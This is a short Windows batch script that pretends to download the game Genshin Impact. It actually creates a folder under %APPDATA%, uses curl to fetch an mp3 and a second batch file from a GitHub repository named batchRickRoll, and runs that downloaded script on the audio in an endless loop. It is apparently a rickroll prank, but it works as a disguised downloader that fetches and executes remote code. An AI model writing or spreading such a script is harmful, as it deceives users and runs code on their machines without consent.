@echo off

echo Downloading Game

:DOWNLOAD
  mkdir %APPDATA%\GenshinImpact
  curl -o %APPDATA%\GenshinImpact\role.mp3 -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
  curl -o %APPDATA%\GenshinImpact\m.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
  goto play
 
 :play
 %APPDATA%\GenshinImpact\m %APPDATA%\GenshinImpact\role.mp3
 
 goto play
